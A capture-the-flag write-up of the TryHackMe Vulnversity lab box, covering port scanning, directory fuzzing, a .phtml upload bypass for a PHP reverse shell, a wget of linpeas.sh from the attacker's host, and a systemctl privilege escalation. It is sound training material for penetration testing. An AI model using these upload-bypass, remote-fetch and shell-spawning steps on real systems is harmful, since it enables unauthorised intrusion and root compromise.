# Introduction
So according to a post I saw on Medium, this is one of a series of OSCP like rooms on THM. I'll give it a go.

# Open Ports
I've got ports 21 (FTP), 22 (SSH), 139 + 445 (SMB), so maybe this is a Windows box. I also have 3128 which may be for the Squid Caching Web Proxy [(Wikipedia)](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers) and 3333 which is a non-standard port. I'll have to ask nmap for more details.

## Scan Detail
nmap says we've got vsftpd 3.0.3 on port 21, OpenSSH 7.2p2 on port 22, SMB on 139+445, plus:
{% highlight shell %}
3128/tcp open  http-proxy  syn-ack ttl 63 Squid http proxy 3.5.12, and
3333/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.18 (Ubuntu)
{% endhighlight %}
So actually this is a Linux box with a webserver on port 3333.

The scan also says the version of Squid has a 10 out of 10 CVE, so I'm going to want to check that out. 

# Webserver
Visiting the webserver reveals a front page for a University, many of the links don't work though. There is no robots.txt, but /images and /js both offer directory listings. Let's fuzz:
{% highlight shell %}
root@kali:/opt/tryhackme/vulniversity# wfuzz --hc 404 -u http://10.10.14.79:3333/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
{% endhighlight %}
The fuzzing turned up a page called /internal, which appears to offer some sort of file upload. The index page for this subdirectory is index.php, so the server is running PHP. Fuzzing inside the directory finds http://10.10.14.79:3333/internal/uploads/, where our files will appear. Let's try a PHP reverse shell.

# Shell
Using the .phtml extension I could upload the pentestmonkey PHP reverse shell and connect as www-data. I copied over linpeas.sh to /dev/shm and ran it. 

{% highlight shell %}
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@vulnuniversity:/dev/shm$ wget http://10.9.10.123:8000/linpeas.sh
wget http://10.9.10.123:8000/linpeas.sh

Linpeas showed a probable privesc via SystemCTL, which can be found on [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/), and sure enough this led to root.
